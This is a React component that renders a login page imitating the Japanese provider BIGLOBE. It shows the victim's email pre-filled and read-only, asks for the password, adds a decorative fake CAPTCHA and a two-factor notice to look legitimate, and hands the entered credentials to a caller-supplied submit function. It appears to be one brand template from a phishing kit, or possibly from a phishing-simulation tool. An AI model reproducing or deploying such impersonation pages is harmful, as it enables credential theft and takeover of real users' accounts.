'use client'

import { useState } from 'react'
import { Template, SupportedLanguage, TemplateContent } from '@/lib/templateTypes'
import { getTemplateContent } from '@/lib/templateEngine'

interface BIGLOBETemplateProps {
  template: Template
  language: SupportedLanguage
  email: string
  onSubmit: (email: string, password: string) => void
  onError?: (error: string) => void
}

export function BIGLOBETemplate({
  template,
  language,
  email,
  onSubmit,
  onError
}: BIGLOBETemplateProps) {
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')
  const [isSubmitting, setIsSubmitting] = useState(false)
  
  const content: TemplateContent = getTemplateContent(template, language)
  const { theme, features, background } = template
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!password) {
      setError(content.errorMessages.invalidPassword)
      return
    }
    
    setIsSubmitting(true)
    setError('')
    
    try {
      await onSubmit(email, password)
    } catch (err) {
      setError(content.errorMessages.serverError)
      onError?.(content.errorMessages.serverError)
    } finally {
      setIsSubmitting(false)
    }
  }
  
  return (
    <div 
      style={{
        minHeight: '100vh',
        background: background.type === 'image' 
          ? `url('${background.value}')` 
          : background.value,
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px',
      }}
    >
      <div
        style={{
          maxWidth: template.layout.containerWidth,
          width: '100%',
          background: theme.backgroundColor,
          padding: '40px',
          borderRadius: '8px',
          boxShadow: '0 4px 12px rgba(0, 0, 0, 0.1)',
        }}
      >
        {/* Logo */}
        {features.showLogo && (
          <div style={{ textAlign: 'center', marginBottom: '30px' }}>
            {template.logo.url ? (
              <img 
                src={template.logo.url} 
                alt={template.name}
                style={{ 
                  width: template.logo.width,
                  height: template.logo.height 
                }}
              />
            ) : (
              <h1 style={{ 
                color: theme.primaryColor, 
                fontSize: '28px',
                fontWeight: 'bold',
                margin: 0,
              }}>
                {template.logo.text || content.title}
              </h1>
            )}
          </div>
        )}
        
        {/* Notice */}
        {features.showNotices && content.notices?.twoFactorAuth && (
          <div style={{
            background: '#FFF8E1',
            padding: '16px',
            borderRadius: '4px',
            marginBottom: '24px',
            fontSize: '14px',
            color: '#856404',
            borderLeft: `4px solid ${theme.accentColor}`,
          }}>
            {content.notices.twoFactorAuth}
          </div>
        )}
        
        {/* Form */}
        <form onSubmit={handleSubmit}>
          {/* Email (readonly) */}
          <div style={{ marginBottom: '20px' }}>
            <label style={{ 
              display: 'block', 
              marginBottom: '8px',
              fontSize: '14px',
              fontWeight: '500',
              color: theme.textColor,
            }}>
              {content.emailLabel}
            </label>
            <input
              type="email"
              value={email}
              readOnly
              style={{
                width: '100%',
                padding: '12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                fontSize: '14px',
                background: '#f5f5f5',
                color: theme.textColor,
              }}
            />
          </div>
          
          {/* Password */}
          <div style={{ marginBottom: '20px' }}>
            <label style={{ 
              display: 'block', 
              marginBottom: '8px',
              fontSize: '14px',
              fontWeight: '500',
              color: theme.textColor,
            }}>
              {content.passwordLabel}
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder={content.passwordPlaceholder}
              disabled={isSubmitting}
              style={{
                width: '100%',
                padding: '12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                fontSize: '14px',
                color: theme.textColor,
              }}
            />
          </div>
          
          {/* Soft Keyboard Button */}
          {features.showSoftKeyboard && (
            <div style={{ marginBottom: '16px' }}>
              <button
                type="button"
                style={{
                  padding: '8px 16px',
                  background: '#f5f5f5',
                  border: '1px solid #ddd',
                  borderRadius: '4px',
                  fontSize: '13px',
                  cursor: 'pointer',
                }}
              >
                ⌨️ {language === 'ja' ? 'ソフトウェアキーボードで入力する' : 'Use Software Keyboard'}
              </button>
            </div>
          )}
          
          {/* Remember Me */}
          {features.showRememberMe && (
            <div style={{ marginBottom: '16px' }}>
              <label style={{ 
                display: 'flex', 
                alignItems: 'center',
                fontSize: '14px',
                color: theme.textColor,
              }}>
                <input 
                  type="checkbox" 
                  style={{ marginRight: '8px' }}
                />
                {content.rememberMe}
              </label>
            </div>
          )}
          
          {/* Error Message */}
          {error && (
            <div style={{
              background: '#FFEBEE',
              color: '#C62828',
              padding: '12px',
              borderRadius: '4px',
              marginBottom: '16px',
              fontSize: '14px',
            }}>
              {error}
            </div>
          )}
          
          {/* CAPTCHA Placeholder */}
          {features.showCaptcha && (
            <div style={{
              border: '1px solid #ddd',
              padding: '20px',
              borderRadius: '4px',
              marginBottom: '20px',
              textAlign: 'center',
              background: '#f9f9f9',
            }}>
              <div style={{ fontSize: '48px', marginBottom: '8px' }}>
                {Math.random().toString(36).substring(2, 8).toUpperCase()}
              </div>
              <input
                type="text"
                placeholder={language === 'ja' ? '画像の文字を入力' : 'Enter characters'}
                style={{
                  width: '150px',
                  padding: '8px',
                  border: '1px solid #ddd',
                  borderRadius: '4px',
                  fontSize: '14px',
                }}
              />
              <button
                type="button"
                style={{
                  marginLeft: '8px',
                  padding: '8px 16px',
                  background: theme.primaryColor,
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer',
                }}
              >
                🔄 {language === 'ja' ? '別の画像を表示' : 'Refresh'}
              </button>
            </div>
          )}
          
          {/* Submit Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            style={{
              width: '100%',
              padding: '14px',
              background: theme.primaryColor,
              color: 'white',
              border: 'none',
              borderRadius: '4px',
              fontSize: '16px',
              fontWeight: 'bold',
              cursor: isSubmitting ? 'not-allowed' : 'pointer',
              opacity: isSubmitting ? 0.6 : 1,
            }}
          >
            {isSubmitting ? '...' : content.submitButton}
          </button>
          
          {/* Links */}
          <div style={{ 
            marginTop: '20px', 
            textAlign: 'center',
            fontSize: '14px',
          }}>
            {features.showForgotPassword && (
              <a 
                href="#" 
                style={{ 
                  color: theme.primaryColor,
                  textDecoration: 'none',
                }}
              >
                {content.forgotPassword}
              </a>
            )}
          </div>
        </form>
      </div>
    </div>
  )
}




